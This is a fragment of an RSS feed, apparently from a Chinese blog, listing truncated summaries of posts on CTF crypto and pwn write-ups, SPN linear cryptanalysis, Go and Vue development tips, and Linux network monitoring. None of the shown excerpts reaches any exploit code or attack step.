      <guid>/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/CTF/crypto/%E9%9D%9E%E5%AF%B9%E7%A7%B0%E5%8A%A0%E5%AF%86/%E7%A6%BB%E6%95%A3%E5%AF%B9%E6%95%B0/ElGamal/VolgaCTF2020Qualifier-Crypto-Guess-writeup.html</guid>
      <description>tags: crypto,ctf,writeup VolgaCTF2020Qualifier Crypto Guess writeup 上周末玩了下VolgaCTF 2020 Qualifier(https://ctftime.org/event/933), 只做了几道密码题，因为其他题都没有思路T_T 。整体感觉俄罗斯人的脑洞很大，数学功底很好。其中有一道ElGamal相关的密码题，虽然没感觉在现实中有什么实际用途，但是学到了一些重要的性质。
我的解法比较简单，但是好像是非预期解。赛后，在这篇wp里发现了一个更完美的解法：标准解法的wp(https://www.josephsurin.me/posts/2020-03-30-volgactf-2020-qualifier-writeups#guess) 。我会在第三节记录下我的解法，在第四节简单翻译下标准解法。
一、题目信息  Guess
Try to guess all encrypted bits and get your reward!
server.py(https://q.2020.volgactf.ru/files/541eeaf9fdf2d86fbe87def09be7e560/server.py)
nc guess.q.2020.volgactf.ru 7777
Your team has solved this task on Mar 28 at 21:20 UTC.
179 other teams have managed to do the same.
This task has been rated by 73 teams. The average rating is 3.99 (5.00 max).
 server.py如下：
#!/usr/bin/python # -*- coding: utf-8 -*- from __future__ import print_function from Crypto.</description>
    </item>
    
    <item>
      <title>SPN线性密码分析</title>
      <link>/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%90%86%E8%AE%BA/%E5%AF%86%E7%A0%81%E5%AD%A6/%E5%AF%86%E7%A0%81%E5%88%86%E6%9E%90/SPN%E7%BA%BF%E6%80%A7%E5%AF%86%E7%A0%81%E5%88%86%E6%9E%90.html</link>
      <pubDate>Tue, 24 Mar 2020 01:01:00 +0000</pubDate>
      
      <guid>/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%90%86%E8%AE%BA/%E5%AF%86%E7%A0%81%E5%AD%A6/%E5%AF%86%E7%A0%81%E5%88%86%E6%9E%90/SPN%E7%BA%BF%E6%80%A7%E5%AF%86%E7%A0%81%E5%88%86%E6%9E%90.html</guid>
      <description>SPN线性密码分析 在学习SPN线性密码分析时，我找了很多资料。但是很多时候都感觉这些材料不算细致，我也遇到了非常多的困惑，所以希望能细致入微的记录一下。
本文基本上是 A Tutorial on Linear and Differential Cryptanalysis 的翻译，用自己的语言复述了一遍，加了部分自己的理解。
一、块加密 块加密(Block Cipher)，或称为分组加密，是一种对称加密算法。它将明文分成多个等长的块（block），使用确定的算法和对称密钥对每组分别加密解密。通常来说，每个块使用的加密算法是相同的，但是密码组件不一定相同，例如不同块的S盒不一定相同。
二、SPN SPN——代换-置换网络(Substitution–permutation network), 是一系列被应用于分组密码中相关的数学运算，最典型的就是AES。这种加密网络使用明文块和密钥块作为输入，并通过交错的若干“轮”代换操作和置换操作产生密文块。代换（Substitution）和置换（Permutation）的组件分别被称作S盒（替换盒，S-boxes）和P盒（排列盒，P-boxes）。
我在解SPN和Feistel相关算法的密码时，常常会觉得代换密码和置换密码的区别十分有限，非常困惑，后来我在写本文时想通了，如果你也有这个困惑，可以参考一下我的这篇博客：代换密码和置换密码在块加密中的作用与区别
下图是 Heys 在 A Tutorial on Linear and Differential Cryptanalysis 中设计的一个非常基础的&amp;quot;Toy Cipher&amp;quot;。
我们可以通过这个基础的&amp;quot;Toy Cipher&amp;quot;，来学习一下SPN。
这个SPN密码中，输入16bit的明文和16bit的密钥，输出16bit的密文。分为4个块，每个块中, 分别有4bit明文、密文。共有4轮加密，每一轮加密由3个过程组成：
 轮密钥异或 代换 (Substitution) 置换 (Permutation)  在第四轮，没有置换过程，增加了一个轮密钥异或的过程。
没有置换是因为置换密码主要起到的是扩散功能，使字母分布失去统计特征。置换密码是一个完全线性的过程，因此在最后一轮中，置换加密不会提升安全性。
增加了一轮 轮密钥异或，主要是为了防止最后一轮的代换密码在密码分析中被非常容易的绕过。
某种意义上，也可以认为是为了加密过程与解密过程的对称。
1. 轮密钥异或 本例中，每一轮密钥都未知，每轮密钥之间的关系也未知。
2. 代换 (Substitution)    input 0 1 2 3 4 5 6 7 8 9 A B C D E F     output E 4 D 1 2 F B 8 3 A 6 C 5 9 0 7    这是一个4x4的s盒，通常一个加密算法中会有多个s盒，s盒的数量与input的长度有关：</description>
    </item>
    
    <item>
      <title>正确使用Go DockerSDK(gomod)</title>
      <link>/post/%E5%BC%80%E5%8F%91/golang/Docker-SDK/%E6%AD%A3%E7%A1%AE%E4%BD%BF%E7%94%A8Go-DockerSDKgomod.html</link>
      <pubDate>Sun, 29 Dec 2019 17:30:00 +0000</pubDate>
      
      <guid>/post/%E5%BC%80%E5%8F%91/golang/Docker-SDK/%E6%AD%A3%E7%A1%AE%E4%BD%BF%E7%94%A8Go-DockerSDKgomod.html</guid>
      <description>正确使用Go DockerSDK(gomod) 1. 背景 1.1 go语言特性: 标准导入路径(canonical import path)  Go 1.4 introduces an annotation for package clauses in Go source that identify a canonical import path for the package. If an import is attempted using a path that is not canonical, the go command will refuse to compile the importing package.
https://golang.org/doc/go1.4#canonicalimports
 go1.4 引入了一个特性，在package后可以使用注释声明导入这个包的标准路径, 叫做canonical import path。如果导入某个包的路径与这个canonical import path不同，则go命令会拒绝编译该包。
例如：
package pdf // import &amp;quot;rsc.io/pdf&amp;quot; 1.2 docker项目更名 docker详细开发现状参见: docker开发现状</description>
    </item>
    
    <item>
      <title>如何使用BootstrapVue</title>
      <link>/post/%E5%BC%80%E5%8F%91/%E5%89%8D%E7%AB%AF/Vue/%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8BootstrapVue.html</link>
      <pubDate>Fri, 04 Oct 2019 05:58:00 +0000</pubDate>
      
      <guid>/post/%E5%BC%80%E5%8F%91/%E5%89%8D%E7%AB%AF/Vue/%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8BootstrapVue.html</guid>
      <description>如何使用BootstrapVue 一、使用WebStorm创建Vue项目 二、在main.js引用BootstrapVue import BootstrapVue from &amp;#39;bootstrap-vue&amp;#39; import &amp;#39;bootstrap/dist/css/bootstrap.css&amp;#39; import &amp;#39;bootstrap-vue/dist/bootstrap-vue.css&amp;#39; Vue.use(BootstrapVue) 三、现在可以使用BootstrapVue了 &amp;lt;b-btn variant=&amp;#34;info&amp;#34;&amp;gt;submit&amp;lt;/b-btn&amp;gt; </description>
    </item>
    
    <item>
      <title>pwnable.tw-100-start</title>
      <link>/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/CTF/pwn/linux-pwn/stack-overflow/pwnable.tw-100-start.html</link>
      <pubDate>Mon, 02 Sep 2019 18:13:00 +0000</pubDate>
      
      <guid>/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/CTF/pwn/linux-pwn/stack-overflow/pwnable.tw-100-start.html</guid>
      <description>tags: ctf,writeup,pwn pwnable.tw-100-start 1. 代码分析 1.1 文件信息 这是一个32位的Elf文件
$ file start start: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), statically linked, not stripped checksec显示未开启任何安全保护机制
$ checksec start [*] &amp;#39;/home/st0n3/ctfs/pwnable.tw/100_Start/challenges/start&amp;#39; Arch: i386-32-little RELRO: No RELRO Stack: No canary found NX: NX disabled PIE: No PIE (0x8048000) 1.2 汇编代码 使用r2分析汇编，只有一个entry0入口函数。
$ r2 start Warning: Cannot initialize dynamic strings [0x08048060]&amp;gt; aaa [x] Analyze all flags starting with sym. and entry0 (aa) [x] Analyze function calls (aac) [x] Analyze len bytes of instructions for references (aar) [x] Constructing a function name for fcn.</description>
    </item>
    
    <item>
      <title>p32 or p64 or struct ?</title>
      <link>/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/CTF/pwn/pwntools/p32-or-p64-or-struct.html</link>
      <pubDate>Sun, 01 Sep 2019 15:47:00 +0000</pubDate>
      
      <guid>/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/CTF/pwn/pwntools/p32-or-p64-or-struct.html</guid>
      <description> tags: ctf,pwn p32 or p64 or struct ? &amp;gt;&amp;gt;&amp;gt; from pwn import * &amp;gt;&amp;gt;&amp;gt; import struct &amp;gt;&amp;gt;&amp;gt; p32(0xdeadbeef) &amp;#39;\xef\xbe\xad\xde&amp;#39; &amp;gt;&amp;gt;&amp;gt; struct.pack(&amp;#34;I&amp;#34;,0xdeadbeef) == p32(0xdeadbeef) True &amp;gt;&amp;gt;&amp;gt; p64(0xdeadbeef) &amp;#39;\xef\xbe\xad\xde\x00\x00\x00\x00&amp;#39; &amp;gt;&amp;gt;&amp;gt; struct.pack(&amp;#34;l&amp;#34;,0xdeadbeef) == p64(0xdeadbeef) True reference  pwntools doc struct doc  </description>
    </item>
    
    <item>
      <title>Go os/exec坑</title>
      <link>/post/%E5%BC%80%E5%8F%91/golang/go%E5%9D%91/Go-osexec%E5%9D%91.html</link>
      <pubDate>Tue, 27 Aug 2019 15:00:00 +0000</pubDate>
      
      <guid>/post/%E5%BC%80%E5%8F%91/golang/go%E5%9D%91/Go-osexec%E5%9D%91.html</guid>
      <description> tags: golang Go os/exec坑 cp: cannot stat ‘./test/*’: No such file or directory out, err := exec.Command(&amp;#34;cp&amp;#34;, &amp;#34;./test/*&amp;#34;, &amp;#34;/tmp&amp;#34;).CombinedOutput() logrus.Info(cmd) logrus.Info(string(out)) 这里的*不会被认为是通配符，而是认为是个文件。因为*作为globbing的功能是shell提供的，golang的os/exec库直接调用命令，不涉及shell。
https://stackoverflow.com/questions/31467153/golang-failed-exec-command-that-works-in-terminal
使用以下方法避免
cmd := &amp;#34;cp ./test/* /tmp -r&amp;#34; out, err := exec.Command(&amp;#34;sh&amp;#34;, &amp;#34;-c&amp;#34;, cmd).CombinedOutput() logrus.Info(cmd) logrus.Info(string(out)) </description>
    </item>
    
    <item>
      <title>linux下如何优雅得网速监控</title>
      <link>/post/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E6%9C%AC/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/linux/linux%E4%B8%8B%E5%A6%82%E4%BD%95%E4%BC%98%E9%9B%85%E5%BE%97%E7%BD%91%E9%80%9F%E7%9B%91%E6%8E%A7.html</link>
      <pubDate>Sun, 18 Aug 2019 17:05:00 +0000</pubDate>
      
      <guid>/post/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E6%9C%AC/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/linux/linux%E4%B8%8B%E5%A6%82%E4%BD%95%E4%BC%98%E9%9B%85%E5%BE%97%E7%BD%91%E9%80%9F%E7%9B%91%E6%8E%A7.html</guid>
      <description>linux下如何优雅得网速监控 安装nload sudo apt-get install nload 使用 nload -u K wlan0
Device wlan0 [100.66.25.144] (1/1): ================================================================================= Incoming: # #. ## | Curr: 51.75 kByte/s ## #| Avg: 20.50 kByte/s .## |## Min: 0.00 kByte/s ### ###| Max: 1159.04 kByte/s .. |### ####. Ttl: 1.50 GByte Outgoing: Curr: 2.62 kByte/s Avg: 1.95 kByte/s Min: 0.00 kByte/s Max: 39.50 kByte/s Ttl: 63.47 MByte </description>
    </item>
    
  </channel>
</rss>
